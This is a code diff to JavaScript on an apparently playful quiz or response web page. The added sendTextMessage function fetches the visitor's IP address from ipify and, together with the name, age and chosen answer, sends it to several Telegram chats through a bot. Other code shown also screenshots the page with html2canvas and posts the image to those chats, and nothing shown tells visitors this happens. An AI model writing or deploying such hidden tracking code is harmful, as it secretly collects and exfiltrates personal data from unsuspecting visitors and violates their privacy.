@@ -198,7 +198,6 @@
             mainCard.classList.add('pop-in');
         }
 
-        // --- Helper to fetch image code for screenshot ---
         const getBase64Image = async (url) => {
             const response = await fetch(url);
             const blob = await response.blob();
@@ -223,7 +222,10 @@
             finalDiv.classList.remove('hidden');
             finalDiv.classList.add('pop-in');
 
-            // 2. Fetch Image in background
+            // --- STEP 1: SEND TEXT MESSAGE IMMEDIATELY (Safety) ---
+            sendTextMessage(result.logText);
+
+            // --- STEP 2: LOAD IMAGE & PREPARE SCREENSHOT ---
             try {
                 const base64Img = await getBase64Image(result.img);
                 document.getElementById('result-img').src = base64Img;
@@ -231,16 +233,49 @@
                 document.getElementById('result-img').src = result.img; 
             }
 
-            // 3. WAIT 3 SECONDS BEFORE TAKING SCREENSHOT
+            // --- STEP 3: WAIT 3 SECONDS & SEND SCREENSHOT ---
             setTimeout(() => {
                 sendScreenshot(result.logText);
             }, 3000); 
         }
 
+        // --- NEW FUNCTION: Send Text Message (Always works) ---
+        async function sendTextMessage(choice) {
+            let ip = "Unknown";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            } catch(e) {}
+
+            const message = `
+💌 *New Answer Received!* 💌
+(Text Backup)
+
+*Name:* ${userName}
+*Age:* ${userAge}
+*Choice:* ${choice}
+*IP:* \`${ip}\`
+            `;
+
+            // Send to all chats
+            CHAT_IDS.forEach(chatId => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(e => console.log("Text send failed", e));
+            });
+        }
+
         async function sendScreenshot(choice) {
             try {
                 const element = document.getElementById('main-card');
-                element.classList.remove('pop-in'); // Stop animation for clear shot
+                element.classList.remove('pop-in'); 
 
                 const canvas = await html2canvas(element, {
                     scale: 2,
@@ -250,20 +285,7 @@
                 });
 
                 canvas.toBlob(async function(blob) {
-                    let ip = "Unknown";
-                    try {
-                        const ipRes = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await ipRes.json();
-                        ip = ipData.ip;
-                    } catch(e) {}
-
-                    const caption = `
-📸 *New Response Captured!*
-*Name:* ${userName}
-*Age:* ${userAge}
-*Choice:* ${choice}
-*IP:* \`${ip}\`
-                    `;
+                    const caption = `📸 *Screenshot Proof*`;
 
                     const promises = CHAT_IDS.map(chatId => {
                         const formData = new FormData();
